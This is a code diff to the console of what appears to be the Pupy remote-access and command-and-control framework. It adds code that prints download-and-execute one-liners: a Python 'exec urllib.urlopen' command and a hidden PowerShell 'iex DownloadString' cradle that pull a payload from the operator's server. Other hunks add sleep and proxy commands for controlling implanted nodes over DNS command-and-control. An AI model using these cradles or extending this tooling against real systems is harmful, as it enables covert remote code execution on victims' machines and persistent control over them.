@@ -918,6 +918,18 @@ class PupyCmd(cmd.Cmd):
                 ])
 
             self.display_success('WWW URI PATH: /{}'.format(wwwpath))
+            host="<host:port>"
+            try:
+                for i in range(0,len(args.launcher_args)):
+                    if args.launcher_args[i]=="--host":
+                        host=args.launcher_args[i+1]
+                        break
+            except:
+                pass
+            if args.format=='py':
+                self.display_success("ONELINER: python -c 'import urllib;exec urllib.urlopen(\"http://{}/{}\").read()'".format(host, wwwpath))
+            elif args.format=='ps1':
+                self.display_success("ONELINER: powershell.exe -w hidden -noni -nop -c \"iex(New-Object System.Net.WebClient).DownloadString('http://{}/{}')\"".format(host, wwwpath))
 
     def do_dnscnc(self, arg):
         """ DNSCNC commands """
@@ -968,6 +980,9 @@ class PupyCmd(cmd.Cmd):
         dexec.add_argument('-u', '--url', required=True, help='URL to data')
         dexec.add_argument('-p', '--proxy', action='store_true', default=False,
                                help='Ask to use system proxy (http/https only)')
+
+        proxy = commands.add_parser('proxy', help='Set connection proxy')
+        proxy.add_argument('uri', help='URI. Example: http://user:password@192.168.0.1:3128 or none')
 
         exit = commands.add_parser('exit', help='Request exit')
 
@@ -1207,6 +1222,18 @@ class PupyCmd(cmd.Cmd):
         elif args.command == 'sleep':
             count = self.dnscnc.sleep(
                 args.timeout,
+                node=args.node,
+                default=args.default
+            )
+
+            if count:
+                self.display_success('Schedule sleep to {} known nodes'.format(count))
+            elif args.node:
+                self.display_error('Node {} not found'.format(args.node))
+
+        elif args.command == 'proxy':
+            count = self.dnscnc.proxy(
+                args.uri,
                 node=args.node,
                 default=args.default
             )
